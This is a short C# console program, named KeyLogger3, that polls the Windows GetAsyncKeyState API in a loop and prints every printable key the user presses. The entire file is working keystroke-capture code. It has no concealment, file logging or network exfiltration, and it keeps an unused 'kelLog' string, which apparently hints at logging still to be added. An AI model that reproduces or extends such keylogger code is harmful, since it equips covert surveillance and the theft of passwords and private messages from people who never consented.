using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KeyLogger3
{
    internal class Program
    {
        [DllImport("User32.dll")]

        public static extern int GetAsyncKeyState(Int32 i);
        
        static string kelLog = "";
        static void Main(string[] args)
        {

            while (true)
            {
                Thread.Sleep(5);

                for (int i = 32; i < 127; i++)
                {
                    int keySate = GetAsyncKeyState(i);
                    if (keySate == 32769)
                    {
                        Console.Write((char)i + ", ");
                    }
                }
            }
        }
    }
}
